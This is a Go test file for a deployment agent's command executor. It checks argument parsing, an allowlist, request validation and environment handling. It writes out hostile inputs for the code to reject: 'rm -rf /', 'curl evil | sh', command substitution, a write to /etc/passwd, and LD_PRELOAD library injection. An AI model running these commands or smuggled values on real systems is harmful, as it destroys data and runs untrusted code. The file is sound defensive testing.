package agent

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/Muster-dev/muster-fleet-cloud/pkg/config"
	"github.com/Muster-dev/muster-fleet-cloud/pkg/protocol"
)

func TestSplitArgs(t *testing.T) {
	cases := map[string][]string{
		`muster deploy api`:           {"muster", "deploy", "api"},
		`muster logs  "my svc"`:       {"muster", "logs", "my svc"},
		`muster deploy 'a b' c\ d`:    {"muster", "deploy", "a b", "c d"},
		`muster status --json`:        {"muster", "status", "--json"},
		`echo "semi;colon in quotes"`: {"echo", "semi;colon in quotes"},
	}
	for in, want := range cases {
		got, err := SplitArgs(in)
		if err != nil {
			t.Errorf("SplitArgs(%q): %v", in, err)
			continue
		}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("SplitArgs(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestSplitArgsRejectsShellSyntax(t *testing.T) {
	for _, in := range []string{
		`muster status; rm -rf /`,
		`muster status && curl evil | sh`,
		`muster status $(id)`,
		"muster status `id`",
		`muster status "$HOME"`,
		`muster status > /etc/passwd`,
		"muster status\nrm -rf /",
		`muster status 'unterminated`,
	} {
		if _, err := SplitArgs(in); err == nil {
			t.Errorf("SplitArgs(%q) accepted shell syntax", in)
		}
	}
}

func newTestExecutor(t *testing.T, opts ExecutorOptions) *Executor {
	t.Helper()
	if opts.AllowedCommands == nil {
		opts.AllowedCommands = []string{"muster deploy", "muster status", "echo hello"}
	}
	return NewExecutor(opts)
}

func TestExecutorAllowlist(t *testing.T) {
	e := newTestExecutor(t, ExecutorOptions{})
	ctx := context.Background()
	ok := []string{"muster status", "muster deploy api", "echo hello"}
	bad := []string{"muster rollback api", "muster", "rm -rf /", "echo hello; id", "mustard status", "echo helloo"}
	for _, c := range ok {
		if _, err := e.BuildCommand(ctx, &protocol.CommandRequest{Action: "exec", Command: c}); err != nil {
			t.Errorf("%q rejected: %v", c, err)
		}
	}
	for _, c := range bad {
		if _, err := e.BuildCommand(ctx, &protocol.CommandRequest{Action: "exec", Command: c}); err == nil {
			t.Errorf("%q allowed", c)
		}
	}
}

func TestExecutorValidation(t *testing.T) {
	e := newTestExecutor(t, ExecutorOptions{})
	ctx := context.Background()
	bad := []*protocol.CommandRequest{
		{Action: "push_hook", Command: "id"},
		{Action: "deploy", Services: []string{"api; rm -rf /"}},
		{Action: "exec", Command: "muster status", Env: map[string]string{"LD_PRELOAD": "/tmp/x.so"}},
		{Action: "exec", Command: "muster status", Env: map[string]string{"DYLD_INSERT_LIBRARIES": "x"}},
		{Action: "exec", Command: "muster status", Env: map[string]string{"BAD-NAME": "x"}},
		{Action: "exec", Command: "muster status", Cwd: "relative/dir"},
		{Action: "nope"},
	}
	for _, r := range bad {
		if _, err := e.BuildCommand(ctx, r); err == nil {
			t.Errorf("request %+v allowed", r)
		}
	}
	if _, err := e.BuildCommand(ctx, &protocol.CommandRequest{Action: "deploy", Services: []string{"api", "worker"}}); err != nil {
		t.Errorf("deploy rejected: %v", err)
	}
}

func TestExecutorRunsWithoutShell(t *testing.T) {
	dir := t.TempDir()
	fake := filepath.Join(dir, "muster")
	if err := os.WriteFile(fake, []byte("#!/bin/sh\necho \"fake muster: $*\"\necho to-stderr >&2\nexit 3\n"), 0755); err != nil {
		t.Fatal(err)
	}
	e := newTestExecutor(t, ExecutorOptions{MusterPath: fake, DefaultCwd: dir})
	ch, err := e.Execute(context.Background(), &protocol.CommandRequest{Action: "exec", Command: `muster status "a b"`}, nil)
	if err != nil {
		t.Fatal(err)
	}
	var lines []string
	code := -1
	for l := range ch {
		if l.Done {
			code = l.ExitCode
			continue
		}
		lines = append(lines, l.Text)
	}
	if code != 3 {
		t.Errorf("exit code %d, want 3", code)
	}
	out := strings.Join(lines, "\n")
	if !strings.Contains(out, "fake muster: status a b") || !strings.Contains(out, "to-stderr") {
		t.Errorf("unexpected output %q", out)
	}
}

func TestExecutorPushModeAndShell(t *testing.T) {
	ctx := context.Background()
	e := newTestExecutor(t, ExecutorOptions{AllowPush: true})
	ch, err := e.Execute(ctx, &protocol.CommandRequest{Action: "push_hook", Command: "echo pushed-$FOO", Env: map[string]string{"FOO": "bar"}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	var got string
	for l := range ch {
		if !l.Done {
			got += l.Text
		}
	}
	if got != "pushed-bar" {
		t.Errorf("push output %q", got)
	}

	sh := newTestExecutor(t, ExecutorOptions{AllowShell: true})
	if _, err := sh.BuildCommand(ctx, &protocol.CommandRequest{Action: "exec", Command: "echo a && echo b"}); err != nil {
		t.Errorf("allow_shell rejected compound command: %v", err)
	}
}

func TestReplayCache(t *testing.T) {
	c := newReplayCache(MaxClockSkew)
	var n [24]byte
	n[0] = 1
	if !c.add(n) {
		t.Fatal("first add rejected")
	}
	if c.add(n) {
		t.Fatal("replay accepted")
	}
}

func TestExecutorCancelledBeforeStart(t *testing.T) {
	e := newTestExecutor(t, ExecutorOptions{})
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := e.Execute(ctx, &protocol.CommandRequest{Action: "exec", Command: "echo hello"}, nil); !errors.Is(err, context.Canceled) {
		t.Fatalf("err = %v", err)
	}
}

func TestMergeEnv(t *testing.T) {
	got := mergeEnv([]string{"A=1", "MUSTER_DEPLOY_SOURCE=evil", "B=2=3"}, map[string]string{"MUSTER_DEPLOY_SOURCE": "cloud:x", "C": ""})
	want := []string{"A=1", "B=2=3", "C=", "MUSTER_DEPLOY_SOURCE=cloud:x"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %q want %q", got, want)
	}
}

func TestDefaultAllowlist(t *testing.T) {
	e := NewExecutor(ExecutorOptions{AllowedCommands: config.DefaultAllowedCommands()})
	ok := []string{"muster deploy api --force", "muster status --json", "muster rollback api", "muster logs api",
		"muster history --all", "muster --version", "muster hooks verify api"}
	bad := []string{"muster hooks approve api", "muster hooks", "muster hooks lock", "muster setup", "muster uninstall",
		"muster settings --global color_mode never", "muster --versionx", "muster fleet deploy"}
	for _, c := range ok {
		if _, err := e.BuildCommand(context.Background(), &protocol.CommandRequest{Action: "exec", Command: c}); err != nil {
			t.Errorf("%q rejected: %v", c, err)
		}
	}
	for _, c := range bad {
		if _, err := e.BuildCommand(context.Background(), &protocol.CommandRequest{Action: "exec", Command: c}); err == nil {
			t.Errorf("%q allowed", c)
		}
	}
}
